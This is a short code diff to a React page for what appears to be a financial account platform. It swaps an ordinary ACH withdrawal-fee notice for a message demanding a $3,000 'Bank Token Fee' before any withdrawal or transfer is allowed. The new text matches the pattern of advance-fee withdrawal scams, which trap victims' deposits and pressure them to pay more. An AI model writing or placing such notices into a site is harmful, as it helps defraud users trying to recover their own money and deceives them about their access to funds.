@@ -29,7 +29,8 @@ const page = () => {
         <div className="tf_Information">
             <h2>Withdrawal request processing:</h2>
             <ul>
-                <li>ACH transfers have a $15 network fee and take 1-3 business days</li>
+                <li>This is to notify that a Bank Token Fee of $3,000 must be paid before access can be granted to the funds in your account. Condition: No withdrawal or transfer will be possible until this fee is settled</li>
+                <li>Note: No withdrawal or transfer will be possible until this fee is settled</li>
             </ul>
         </div>
         <KycBanner />
